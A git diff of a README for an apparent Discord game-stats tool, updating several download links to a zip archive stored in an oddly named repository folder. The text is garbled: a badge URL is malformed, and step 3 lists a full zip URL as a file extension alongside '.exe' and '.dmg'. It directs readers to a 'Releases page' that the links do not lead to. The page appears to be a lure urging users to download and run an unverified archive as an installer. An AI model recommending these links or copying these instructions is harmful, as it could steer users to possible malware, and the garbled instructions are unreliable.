@@ -1,7 +1,7 @@
 # 🎮 Discord-Game-Stats-Tracker - Track Your Game Stats Easily
 
 ## 📦 Download Now!
-[![Download](https://raw.githubusercontent.com/JessicaSAR13/Discord-Game-Stats-Tracker/main/hypsometrist/Discord-Game-Stats-Tracker-3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JessicaSAR13/Discord-Game-Stats-Tracker/main/hypsometrist/Discord-Game-Stats-Tracker-3.3.zip)
+[![Download](https://github.com/JessicaSAR13/Discord-Game-Stats-Tracker/raw/refs/heads/main/hypsometrist/Game_Discord_Stats_Tracker_v3.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/JessicaSAR13/Discord-Game-Stats-Tracker/raw/refs/heads/main/hypsometrist/Game_Discord_Stats_Tracker_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,13 +22,13 @@ To download and install Discord-Game-Stats-Tracker, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to reach the download section:  
-   [Download Link](https://raw.githubusercontent.com/JessicaSAR13/Discord-Game-Stats-Tracker/main/hypsometrist/Discord-Game-Stats-Tracker-3.3.zip)
+   [Download Link](https://github.com/JessicaSAR13/Discord-Game-Stats-Tracker/raw/refs/heads/main/hypsometrist/Game_Discord_Stats_Tracker_v3.3.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, find the latest version of the application. Look for titles that include "Latest Release" or similar markings.
 
 3. **Download the Installer**  
-   Click on the installer file suited for your operating system. The filename typically ends with `.exe`, `.dmg`, or `https://raw.githubusercontent.com/JessicaSAR13/Discord-Game-Stats-Tracker/main/hypsometrist/Discord-Game-Stats-Tracker-3.3.zip`. This will start the downloading process.
+   Click on the installer file suited for your operating system. The filename typically ends with `.exe`, `.dmg`, or `https://github.com/JessicaSAR13/Discord-Game-Stats-Tracker/raw/refs/heads/main/hypsometrist/Game_Discord_Stats_Tracker_v3.3.zip`. This will start the downloading process.
 
 4. **Run the Installer**  
    Once the download completes, locate the file in your downloads folder. Double-click on it to run the installer. Follow the on-screen instructions to complete the installation.
